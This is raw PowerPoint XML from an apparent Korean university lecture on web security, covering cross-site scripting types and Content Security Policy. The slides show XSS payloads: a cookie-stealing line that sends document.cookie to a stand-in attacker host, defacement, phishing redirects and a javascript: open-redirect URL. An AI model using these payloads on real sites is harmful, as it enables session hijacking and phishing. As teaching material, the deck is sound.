        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:39:15.442" v="111"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1270930745" sldId="363"/>
            <ac:spMk id="2" creationId="{B42586F1-3536-456A-8B32-CB082CB0CFAA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:39:09.393" v="98"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1270930745" sldId="363"/>
            <ac:spMk id="3" creationId="{EBAC5EE4-6AEF-4A6E-949E-3131E9333209}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}" dt="2021-08-06T02:23:41.758" v="7" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}" dt="2021-08-06T01:54:51.613" v="0" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3993003946" sldId="289"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}" dt="2021-08-06T01:54:51.613" v="0" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3993003946" sldId="289"/>
            <ac:spMk id="3" creationId="{155133CE-E410-4827-9D25-DBE617DBE29C}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}" dt="2021-08-06T02:23:41.758" v="7" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2416698218" sldId="317"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="lhm1024@korea.edu" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{0F02F351-B533-4EE5-81E5-9D148272FC29}" dt="2021-08-06T02:23:41.758" v="7" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2416698218" sldId="317"/>
            <ac:spMk id="3" creationId="{0FACA2A7-FA49-4095-9072-93FD8A69BF12}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.edu::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{6EB83F11-3CD7-45CD-A060-8FE1D5F6A3F8}"/>
    <pc:docChg chg="addSld sldOrd modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.edu::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{6EB83F11-3CD7-45CD-A060-8FE1D5F6A3F8}" dt="2021-07-08T07:00:35.629" v="18"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.edu::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{6EB83F11-3CD7-45CD-A060-8FE1D5F6A3F8}" dt="2021-07-08T07:00:35.629" v="18"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3682925829" sldId="311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7"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3564423949" sldId="312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6"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="228712980" sldId="313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5"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2150555230" sldId="314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4"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="840296087" sldId="315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3"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="607939077" sldId="316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2"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2416698218" sldId="317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1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1137838211" sldId="318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10"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1114188019" sldId="319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9"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2617413653" sldId="320"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.edu::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{6EB83F11-3CD7-45CD-A060-8FE1D5F6A3F8}" dt="2021-07-08T07:00:35.629" v="8"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="78947117" sldId="321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8.903" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3247097004" sldId="323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8.996" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1579073654" sldId="324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043" v="2"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2650239397" sldId="325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090" v="3"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3039382090" sldId="326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153" v="4"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="168451364" sldId="327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199" v="5"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="601295334" sldId="328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4:49.262" v="6"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4141664827" sldId="329"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.edu::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{6EB83F11-3CD7-45CD-A060-8FE1D5F6A3F8}" dt="2021-07-08T06:59:28.987" v="7"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1902405254" sldId="33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1CA8A9-F0F6-47A0-AE59-EE8BA1D350D0}" type="datetimeFigureOut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599-2837-4A6A-84AA-59C1DB2CD0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4646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61804"/>
            <a:ext cx="10058400" cy="35661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3958473"/>
            <a:ext cx="10058400" cy="410746"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="91440" rIns="9144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3B638-323D-49B2-BB1A-66B6C384CB8A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489405" y="5916485"/>
            <a:ext cx="1312025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latin typeface="a고딕11" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕11" panose="02020600000000000000" pitchFamily="18" charset="-127"/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3846252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768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278290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07723"/>
            <a:ext cx="10058400" cy="402336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v"/>
              <a:defRPr b="0"/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8CAE5-601C-4E85-AD8D-C7C12DB03930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D928E83-8EB3-4F03-A738-F765C3B80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489405" y="5916485"/>
            <a:ext cx="1312025" cy="36512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9084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A3C6A-53FA-4313-AAF8-38289F9BDB37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E6A2A5D-356D-40C2-894B-D0B47CDD04D5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F5285024-8F71-45B0-B709-E4A899DBC3B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641805" y="60688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3247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5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A3117-E2A6-4AC4-8122-B1F047B6E776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C6E3C41-F5BF-4839-A28F-442362EBCB08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6788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>
                    <a:lumMod val="9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A98D8-68FB-4B04-88C3-8B03BABBF707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E869A7D-4466-4F38-AF3D-C8F6331593D2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8719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C5D8E8-BF08-4215-82FA-6C38FBEA1CDA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F019259-247C-403D-B974-F1F579D0B893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611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11143-153F-4F7F-99C3-6DE50F1B9E66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4BEF6F52-6374-48E3-A0AA-8AA260415017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7310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4050791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B991D8-E253-4E81-B2F0-83165905CE29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20981C88-C510-44CF-80A8-6D2DD4D12EA6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31446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1">
              <a:lumMod val="50000"/>
              <a:lumOff val="5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79E6337-4C87-4AAC-85FB-A1A543922A7C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081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792BE6-98E0-4461-8058-037AE57844FD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BDDB8FD-FCF8-44F9-933F-AA03AEC79344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422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CFAB4B-15D1-4BA8-BE88-443A455D2818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0AB7DEE-0E95-413B-B102-8E885B6407DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5489405" y="59164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3C588AB-8E84-4C01-BDFA-16202E2AEB0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021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86A888A-EFAA-479A-8905-167092D8D4D0}" type="datetime1">
              <a:rPr lang="ko-KR" altLang="en-US" smtClean="0"/>
              <a:t>2022. 11. 4.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63C588AB-8E84-4C01-BDFA-16202E2AEB06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777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a고딕15" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
          <a:ea typeface="a고딕15" panose="02020600000000000000" pitchFamily="18" charset="-127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3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a고딕12" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
          <a:ea typeface="a고딕12" panose="02020600000000000000" pitchFamily="18" charset="-127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3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://site.com/page?return_url=javascript:alert(1)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swigger.net/web-security/cross-site-scripting/cheat-sheet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ac771f6b1fae782a80400d44008a0088.web-security-academy.net/?search=%3Casdf%20id=x%20onfocus=alert(document.cookie)%20tabindex=1%3E#x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swigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code" TargetMode="Externa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hyperlink" Target="https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge" TargetMode="Externa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hyperlink" Target="https://simjaejin.tistory.com/31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hyperlink" Target="mailto:lhm1024@korea.ac.kr" TargetMode="Externa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9CB0BF-81E0-42EC-91C8-E32C844400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6800" y="2205318"/>
            <a:ext cx="10058400" cy="1635700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dirty="0">
                <a:latin typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:latin typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:latin typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:latin typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕14" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>소수전공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2379862-334E-462A-BC01-BB52500289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998261"/>
            <a:ext cx="10058400" cy="801266"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:latin typeface="a고딕13" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕13" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>이효민</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4271878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497E7-CDC4-491E-B123-9B51288F2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Today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76ED39-4317-4F55-8003-2D3059F91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Cross-Site-Scripting (XSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Content Security Policy (CSP)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3A9907-FD90-4D06-AEC5-16C6A7023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8442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D4EED0-B030-45CB-AF06-40AC5B7B2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Cross-site scripting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8E8451-B2D7-4A16-9E6B-BEDDAE295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XSS?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>종류</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>우회 및 대응 방안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1AC852-2DCC-4E7A-9D75-104A6C1A5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4056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010A7-A260-489C-B0A3-4178CC49F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Cross-site scripting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901B2A-2F43-4D77-8778-EFDC9C4E2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Cross-site scripting (also known as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>XSS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Client-side attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격자가 악의적인 스크립트 코드를 웹 사이트에 삽입한 후</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>사용자의 웹 브라우저에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>해당 코드가 실행되도록 만드는 공격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9768CF-B2B3-45FF-B19A-465DD885F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3425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499E31-F131-4E50-B6AF-062FFF20E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Cross-site scripting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854D58-CDD9-4CA1-BDA3-8230BA85D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일반적으로 사용자의 쿠키를 탈취하여 사용자의 권한을 획득할 수 있음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사용자가 액세스할 수 있는 모든 기능을 제어할 수 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="201168" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>페이지 변조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위치 이동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D3011E-3379-49FF-8C70-E4ADDDEFF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239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F06FF-50AC-43F5-9725-F46736D1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Cross-site scripting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B534E6-48F6-4AEE-BCE3-7FAB9E26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F18D4-C83E-4BDE-BECE-A8E1EEA19125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="1851730"/>
            <a:ext cx="95402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&lt;script&gt;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"hello"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문자열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alert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실행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altLang="ko-KR" dirty="0"/>
              <a:t>alert("hello");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현재 페이지의 쿠키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(return type: string)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>; 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현재 페이지의 쿠키를 인자로 가진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alert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실행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altLang="ko-KR" dirty="0"/>
              <a:t>alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>);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쿠키 생성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(key: name, value: test)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> = "name=test;";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new Image()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는 이미지를 생성하는 함수이며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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR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src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는 이미지의 주소를 지정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공격자 주소는 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http://hacker.dreamhack.io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"http://hacker.dreamhack.io/?cookie=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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현재페이지의쿠키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"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주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>new Image().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> = "http://site.com/?cookie=" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.cookie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&lt;/script&gt;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60737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F06FF-50AC-43F5-9725-F46736D1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Cross-site scripting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B534E6-48F6-4AEE-BCE3-7FAB9E26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7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F18D4-C83E-4BDE-BECE-A8E1EEA19125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="1851730"/>
            <a:ext cx="95402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&lt;script&gt;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사용자의 페이지 정보에 접근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altLang="ko-KR" dirty="0"/>
              <a:t>document;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사용자의 페이지에 데이터를 삽입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altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>("Hacked By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>Sunrin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> !");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;/script&gt;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90920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F06FF-50AC-43F5-9725-F46736D1E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Cross-site scripting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1B534E6-48F6-4AEE-BCE3-7FAB9E264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8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0F18D4-C83E-4BDE-BECE-A8E1EEA19125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="1851730"/>
            <a:ext cx="954024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&lt;script&gt;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사용자의 위치를 변경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피싱 공격 등으로 사용됨</a:t>
            </a:r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r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>location.href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> = "http://site.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>naver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>"; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a: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// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR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새 창 열기</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>window.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>("http://hackersite.com/")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;/script&gt;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277014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AB16B-0BFB-445D-89FD-8727FDA30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Cross-site scripting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8896792-F222-498B-9D31-692ADC9613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81395" y="1791046"/>
            <a:ext cx="7528043" cy="4125439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B519D7-C014-4FB6-998B-564E802C2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63028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B4998-45A5-49B6-85A3-DA720DBFE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Cross-site scripting - XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 공격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41FB5A-75C0-47E6-84FC-6692A8D8A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Reflected XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>악성 스크립트가 현재 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTTP request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서 로드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Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>악성 스크립트가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>website</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서 로드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DOM-based XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>서버 측 코드가 아닌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>클라이언트 측 코드에 취약점이 존재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1F7CEB-E7B3-4864-BF81-59555335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1799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B09EBB-9523-4E8A-9E8B-D39135278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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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2CD86C-37F3-4833-86E4-E8EDDA4ED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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 중 가장 간단한 종류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웹 사이트가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>HTTP request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>로 데이터를 수신</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>하여</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>안전하지 않게 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>즉각적으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>HTTP response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 해당 데이터를 포함할 때 발생함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쉽게 말해서</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자의 데이터가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>DB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 들어가지 않고 바로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 포함되는 경우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C930B2-CD28-48DF-962B-1286B952A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0433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4D5973-43AD-4491-AF1B-6EB1217E6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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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3623CE-D07B-4E52-B6B9-8D54C1926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간단한 예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다음과 같이 공격을 수행 가능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D2B748F-2C19-4CF2-8C28-0005621FB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41E4B0-578E-4E6C-AD97-196246167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252" y="2279804"/>
            <a:ext cx="7908862" cy="8906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04336997-FD0F-4F7B-8E27-47EA41C8C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252" y="4132877"/>
            <a:ext cx="7908862" cy="116060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731185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E5F54-2784-4FEF-87D8-68B377718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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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2743BD-546D-4068-994C-608954767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13</a:t>
            </a:fld>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="Reflected XSS explained: how to prevent reflected XSS in your app - Sqreen  Blog">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26D852C9-FBC9-4059-B6E9-941309F01AC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0346" y="1909000"/>
            <a:ext cx="6892268" cy="40227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27322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8A3923-F296-4DA7-BC9A-E77DC258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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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E902D3-4F3F-48C2-8F3E-502542C57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Click jacking, open redirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>등 다른 취약점과 연계하기도 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>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://site.com/page?return_url=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>javascript:alert(1)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0">
              <a:highlight>
                <a:srgbClr val="FF0000"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>게시물을 조회하는 검색 과정</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>등 입력한 데이터에 의해 즉흥적으로 발생함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32AF815-3E3D-4A52-8A2E-89001AB22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50242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6DC9E7-A45A-4F70-B214-7B1DE3E6F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Reflected</a:t>
